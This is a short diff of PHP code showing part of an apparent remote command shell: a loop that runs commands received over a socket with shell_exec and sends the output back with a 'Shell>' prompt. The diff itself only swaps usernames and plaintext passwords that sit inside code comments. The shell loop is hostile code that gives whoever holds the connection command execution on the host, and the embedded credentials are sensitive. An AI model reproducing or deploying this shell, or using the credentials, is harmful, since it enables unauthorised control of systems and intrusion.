@@ -20,7 +20,7 @@ while (true) {
                 break;
             }
 
-            // Execute the command and capture both stdout and stderr Username: CarlT
+            // Execute the command and capture both stdout and stderr Username: BernardP
             $output = shell_exec($cmd . ' 2>&1');
 
             // If the output is empty, show a message
@@ -28,7 +28,7 @@ while (true) {
                 $output = "No output or command not found.";
             }
 
-            // Send back the output Password: P@ssw0rd!@#$
+            // Send back the output Password: S+arbur$+S+RE@M
             fwrite($sock, $output . "\n");
             fwrite($sock, "Shell> "); // Prompt for next command
         }
